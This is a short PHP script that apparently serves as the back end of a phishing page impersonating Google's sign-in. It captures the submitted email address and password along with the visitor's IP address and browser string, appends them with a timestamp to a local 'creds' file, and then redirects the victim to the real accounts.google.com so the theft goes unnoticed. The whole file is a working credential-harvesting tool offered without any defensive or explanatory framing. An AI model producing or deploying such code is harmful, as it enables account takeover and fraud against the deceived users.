<?php
$webpage = "accounts.google.com";
$user = $_POST['Email'];
$pass = $_POST['Password'];
$ip = $_SERVER['REMOTE_ADDR'];
$browser = $_SERVER['HTTP_USER_AGENT'];
date_default_timezone_set("America/Denver");
$myfile = fopen("./creds/creds.html", "a") or die("Unable to open file!");
fwrite($myfile,date("Y-m-d h:i:sa"));
fwrite($myfile,": ".$webpage);
fwrite($myfile,": ".$ip);
fwrite($myfile," --- ".$user);
fwrite($myfile," --- ".$pass);
fwrite($myfile," --- ".$browser);
fwrite($myfile,"\n");
fclose($myfile);
header('Location: https://accounts.google.com');
?>
